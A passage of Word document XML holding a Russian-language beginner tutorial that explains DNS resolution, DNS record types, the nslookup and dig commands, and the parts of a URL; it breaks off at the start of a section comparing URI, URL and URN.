    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Ты вводишь в браузере:** `google.com`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузер проверяет кэш:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Есть ли адрес в кэше браузера? Да → готово!</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет → идём дальше</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ОС проверяет файл hosts:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В Windows: `C:\Windows\System32\drivers\etc\hosts`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В Linux/macOS: `/etc/hosts`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Если там есть запись `142.250.186.46 google.com`, используем её</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет → идём дальше</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**ОС спрашивает DNS-резолвер (рекурсивный DNS-сервер):**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обычно это DNS провайдера (например, `8.8.8.8` — Google DNS, `1.1.1.1` — Cloudflare DNS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**DNS-резолвер проверяет свой кэш:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Есть → возвращаем IP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет → начинаем **рекурсивный поиск**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Рекурсивный поиск:**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Резолвер спрашивает **корневой DNS-сервер** (Root): "Где `.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Корневой сервер отвечает: "Спроси у TLD-сервера для `.com`"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Резолвер спрашивает **TLD-сервер (.com)**: "Где `google.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>TLD-сервер отвечает: "Спроси у авторитативного DNS-сервера Google"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Резолвер спрашивает **авторитативный DNS-сервер Google**: "Какой IP у `google.com`?"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Авторитативный сервер отвечает: `142.250.186.46`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Резолвер возвращает IP браузеру**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Браузер подключается к `142.250.186.46`**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы DNS-запросов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Рекурсивный (Recursive):** Клиент спрашивает резолвер, и резолвер делает всю работу</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итеративный (Iterative):** Клиент сам прыгает между серверами (резолвер делает это за тебя)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы DNS-серверов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Корневые (Root):** 13 логических серверов (на самом деле сотни физических машин по всему миру)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TLD-серверы:** Управляют доменами `.com`, `.org`, `.ru` и т.д.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Авторитативные:** Хранят записи для конкретных доменов (`google.com`, `vk.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Рекурсивные (резолверы):** Выполняют поиск за клиента</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кэширование:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">DNS-записи кэшируются (обычно на 5 минут – 24 часа), чтобы не мучить серверы. Время жизни записи указывается в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TTL (Time To Live)</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Типы DNS-записей</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>DNS хранит не только IP-адреса, но и другую информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные типы записей:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Тип   | Что хранит                          | Пример                                |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|-------------------------------------|---------------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">     | IPv4-адрес                          | `google.com` → `142.250.186.46`       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AAAA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  | IPv6-адрес                          | `google.com` → `2a00:1450:4010:c08::71` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Каноническое имя (алиас)            | `www.google.com` → `google.com`       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MX</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Почтовый сервер                     | `google.com` → `aspmx.l.google.com`   |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>TXT</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Текстовая информация (SPF, DKIM)    | `"v=spf1 include:_spf.google.com ~all"` |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NS</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">    | Авторитативный DNS-сервер           | `google.com` → `ns1.google.com`       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PTR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Обратное преобразование (IP → имя)  | `142.250.186.46` → `google.com`       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SOA</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Информация о зоне (Start of Authority) | Мастер-сервер, email админа, TTL   |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример A-записи:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>google.com.    300    IN    A    142.250.186.46</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓           ↓      ↓     ↓         ↓</w:t>
        <w:br/>
        <w:t>домен         TTL   класс тип      IP-адрес</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Команды для проверки DNS:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Узнать IP по домену (Linux/macOS)</w:t>
        <w:br/>
        <w:t>nslookup google.com</w:t>
        <w:br/>
        <w:t>dig google.com</w:t>
        <w:br/>
        <w:br/>
        <w:t># Windows</w:t>
        <w:br/>
        <w:t>nslookup google.com</w:t>
        <w:br/>
        <w:br/>
        <w:t># Проверить конкретную запись</w:t>
        <w:br/>
        <w:t>dig google.com MX</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>8.1.3. URL (Uniform Resource Locator)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>URL (Uniform Resource Locator)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это адрес ресурса в интернете. Типа почтового адреса, только для веб-страниц, файлов, видео и прочего.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Структура URL:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>протокол://логин:пароль@хост:порт/путь?параметры#якорь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://admin:password@example.com:8080/path/to/page.html?id=123&amp;lang=ru#section1</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓       ↓       ↓        ↓           ↓         ↓               ↓             ↓</w:t>
        <w:br/>
        <w:t>протокол логин  пароль    хост       порт      путь         параметры      якорь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Давай разберём по частям.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Протокол (Scheme)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Протокол</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это способ доступа к ресурсу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные протоколы:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`http://` — Hypertext Transfer Protocol (незащищённый)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`https://` — HTTP Secure (с шифрованием TLS/SSL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ftp://` — File Transfer Protocol (передача файлов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`mailto:` — отправка email (`mailto:admin@example.com`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`file://` — доступ к локальным файлам (`file:///C:/Users/file.txt`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ws://`, `wss://` — WebSocket (для реального времени)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://google.com   ← HTTPS (безопасно)</w:t>
        <w:br/>
        <w:t>http://example.com   ← HTTP (устарело, небезопасно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если протокол не указан, браузер обычно подставляет `https://`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Хост (Host)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Хост</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это доменное имя или IP-адрес сервера.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://google.com        ← Доменное имя</w:t>
        <w:br/>
        <w:t>https://142.250.186.46    ← IP-адрес (работает так же)</w:t>
        <w:br/>
        <w:t>https://localhost         ← Локальный сервер (127.0.0.1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Порт (Port)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Порт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это номер, который указывает, к какому приложению на сервере обращаться.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стандартные порты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Протокол | Порт | Описание                     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|----------|------|------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| HTTP     | 80   | Веб-сервер (незащищённый)    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| HTTPS    | 443  | Веб-сервер (защищённый)      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| FTP      | 21   | Передача файлов              |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| SSH      | 22   | Удалённое управление         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| SMTP     | 25   | Отправка почты               |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| DNS      | 53   | Доменные имена               |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| MySQL    | 3306 | База данных                  |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| PostgreSQL | 5432 | База данных                 |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если порт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>стандартный</w:t>
      </w:r>
      <w:r>
        <w:t>, его можно не указывать:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://example.com       ← Порт 443 (по умолчанию)</w:t>
        <w:br/>
        <w:t>https://example.com:443   ← То же самое</w:t>
        <w:br/>
        <w:t>http://example.com:8080   ← Нестандартный порт (надо указать)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужны порты?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>На одном сервере может быть несколько приложений (веб-сервер, база данных, FTP). Порт указывает, к какому приложению обращаться.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Путь (Path)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Путь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это "адрес" файла или страницы на сервере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://example.com/index.html       ← Файл index.html</w:t>
        <w:br/>
        <w:t>https://example.com/blog/post/123    ← Вложенный путь</w:t>
        <w:br/>
        <w:t>https://example.com/                 ← Корень сайта</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Параметры запроса (Query String)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Параметры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это дополнительные данные, передаваемые серверу.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формат:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?ключ1=значение1&amp;ключ2=значение2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://example.com/search?q=python&amp;lang=ru&amp;page=2</w:t>
        <w:br/>
        <w:t xml:space="preserve">                            ↓         ↓       ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">                         q=python  lang=ru  page=2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это означает: "Найди `python` на русском языке, страница 2".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Для передачи данных серверу (поиск, фильтры, идентификаторы).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Кодирование URL:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Если в параметре есть пробелы или спецсимволы, они кодируются:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://example.com/search?q=hello%20world</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                  ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">                            пробел = %20</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Популярные коды:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пробел: `%20` (или `+`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кириллица: `%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82` (UTF-8)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`#` → `%23`, `&amp;` → `%26`, `?` → `%3F`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6. Якорь (Fragment, Anchor)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Якорь</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это часть страницы, к которой нужно прокрутить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Формат:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#section1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>https://ru.wikipedia.org/wiki/Python#История</w:t>
        <w:br/>
        <w:t xml:space="preserve">                                      ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">                              Прокрутить к разделу "История"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Якорь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не отправляется на сервер</w:t>
      </w:r>
      <w:r>
        <w:t>, он обрабатывается только в браузере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>URI, URL, URN: в чём разница?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>URI (Uniform Resource Identifier)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это общий термин для идентификации ресурса.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы URI:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**URL (Uniform Resource Locator)** — адрес ресурса (указывает, **где** он находится)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   Пример: `https://example.com/page.html`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
